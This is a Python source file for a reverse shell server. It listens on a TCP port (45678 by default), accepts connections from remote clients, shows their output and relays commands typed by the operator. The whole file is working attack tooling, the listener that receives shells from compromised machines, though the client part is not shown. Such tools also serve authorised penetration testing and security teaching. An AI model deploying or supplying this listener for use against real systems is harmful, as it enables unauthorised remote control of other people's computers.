#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
    This module implement the ReverseShellServer.
"""

import asyncore

__all__ = ["ReverseShellServer"]


class ReverseShell(asyncore.dispatcher_with_send):
    """
    This class print informations send by the client and ask the 
    command to the user.
    """

    def handle_read(self):
        """
        This method print informations send by the client and 
        ask the command to the user.
        """
        data = self.recv(65535).decode()
        command = input(data)
        while not command:
            command = input(data.split("\n")[-1])
        self.send(command.encode())


class ReverseShellServer(asyncore.dispatcher):
    """
    This class implement a simple asynchronous TCP server 
    to create the socket to communicate with the client.
    """

    def __init__(self, host, port):
        asyncore.dispatcher.__init__(self)
        self.create_socket()
        self.set_reuse_addr()
        self.bind((host, port))
        self.listen(100)

    def handle_accepted(self, sock, addr):
        """
        This method call the ReverseShell.
        """
        print(f"{addr[0]}:{addr[1]} is connected...")
        ReverseShell(sock)


def main():
    from sys import argv

    port = 45678
    host = ""
    argv_number = 0

    for arg in argv:
        if arg.startswith("--interface=") or arg.startswith("-i="):
            host = arg.split("=")[1]
            argv_number += 1
        elif arg.startswith("--port=") or arg.startswith("-p="):
            try:
                port = int(arg.split("=")[1])
            except ValueError:
                print("ERROR : port must be an integer.")
            else:
                argv_number += 1

    if len(argv) - argv_number > 1:
        print(
            "USAGE : ReverseShellServer --interface=<interface name or adress,"
            " default : ''> --port=<port number, default : 45678>"
        )

    ReverseShellServer(host, port)
    print(f"Server is running on tcp://{host}:{port}")
    try:
        asyncore.loop()
    except KeyboardInterrupt:
        print("Server is not running...")


if __name__ == "__main__":
    main()
